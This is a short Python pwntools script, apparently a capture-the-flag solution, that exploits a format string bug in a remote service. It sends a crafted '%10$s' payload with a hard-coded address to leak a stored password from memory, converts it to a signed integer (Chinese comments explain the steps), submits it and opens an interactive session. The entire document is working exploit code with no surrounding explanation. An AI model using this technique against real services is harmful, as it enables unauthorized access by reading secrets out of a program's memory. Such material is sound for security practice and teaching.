from pwn import *

buf=0x804C044
offset = 10

io = remote(...)

payload = p32(buf) + f"%{offset}$s".encode()

io.recvuntil(b"your name:")
io.send(payload)
io.recvuntil(b"Hello,")
leak = io.recvuntil(b"your passwd:",drop=True)

# 前 4 字节是塞进去的地址，后面才是 %s 打出来的内容
password = u32(leak[4:8].ljust(4, b"\x00"))
# 按有符号 int 比较，负数要带负号
if password >= 0x80000000:
    password -= 0x100000000

io.sendline(str(password).encode())
io.interactive()
